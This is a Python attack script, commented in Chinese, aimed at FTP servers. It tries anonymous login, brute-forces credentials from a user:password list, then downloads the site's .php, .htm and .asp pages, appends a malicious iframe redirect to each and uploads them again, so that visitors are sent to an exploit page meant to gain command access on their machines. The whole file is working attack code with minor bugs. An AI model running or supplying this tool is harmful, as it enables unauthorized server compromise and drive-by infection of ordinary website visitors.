# -*- coding: utf-8 -*-
"""
Created on Thu Jul 11 14:08:21 2019

@author: Administrator
"""
#攻击ftp服务器,暴力破解密码,尝试匿名登录,寻找到ftp服务器中存在的htm,php,等后缀名的文件,
#在其中插入htm语句,使得访问该文件的页面时 重定向到有attack脚本的网页,获得访问主机的命令行参数.
import ftplib
import optparse
import time


def anonLogin(hostname):
    try:
        ftp=ftplib.FTP(hostname)
        ftp.login('anonymous','me@your.com')
        print('\n[*] '+str(hostname) +' FTP Anonymous Logon Succeed.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] '+str(hostname)+' FTP Anonymous Logon Failed .')
        return False
    
def bruteLogin(hostname,passwdFile):
    pF=open(passwdFile,'r')
    for line in pF.readlines():
        userName=line.split(':')[0]
        passWord=line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying : "+userName+"/"+passWord)
        try:
            ftp=ftplib.FTP(hostname)
            ftp.login(userName,passWord)
            print('\n[*]  '+str(hostname) +' FTP Logon Succeed: '+userName+"/"+passWord)
            ftp.quit()
            return (userName,passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None,None)  
def returnDefault(ftp):
    try:
        dirList=ftp.nlst()
    except:
        dirList=[]
        print("[-] Could not list dictionary contents.")
        print('[-] Skipping To Next Target.')
        return
    retList=[]
    for fileName in dirList:
        fn=fileName.lower()
        if '.php' in fn or'.htm' in fn or '.asp' in fn:
            print('[+] Found default page: '+fileName)
        retList.append(fileName)
    return retList

def injectPage(ftp,page,redirect):
    f=open(page+'.tmp','w')
    ftp.retrlines('RETR '+page,f.write)#此处要有空格
    print('[+] Downloaded Page: '+page )
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: '+page)
    ftp.storlines('STOR '+page,open(page+'.tmp'))
    print('[+] Uploaded Injected Page: '+page)
    
def attack(username,password,tgtHost,redirect):
    ftp=ftplib.FTP(tgtHost)
    ftp.login(username,password)
    defPages=returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp,defPage,redirect)

def main():
    parser=optparse.OptionParser('usage%prog '+'-H <target host[s]> -r <redirect page>'+'[-f <userpass file>]')
    parser.add_option('-H',dest='tgtHosts',type='string',help='specify target host')
    parser.add_option('-r',dest='redirect',type='string',help='spercify a redirection page')
    parser.add_option('-f',dest='passwdFile',type='string',help='specify user/password file')
    (options,args)=parser.parse_args()
    tgtHosts=str(options.tgtHosts).split(',')
    passwdFile=options.passwdFile
    redirect=options.redirect
    if(tgtHosts ==None) or (redirect ==None):
        print(parser.usage)
        exit(0)
        
    for tgtHost in tgtHosts:
        username=None
        password=None
        if anonLogin(tgtHost) ==True:
            username='anonymous'
            password='me@your.com'
            print('[+] Using Anonymous creds to attack')
            attack(username,password,tgtHost,redirect)
        elif passwdFile !=None:
            (username,password)=bruteLogin(tgtHost,passwdFile)
        if password != None:
            print('[+] Using Creds: '+username+'/'+password+' to attack')
            attack(username,password,tgtHost,redirect)
if __name__=="__main__":
    main()
            
        
















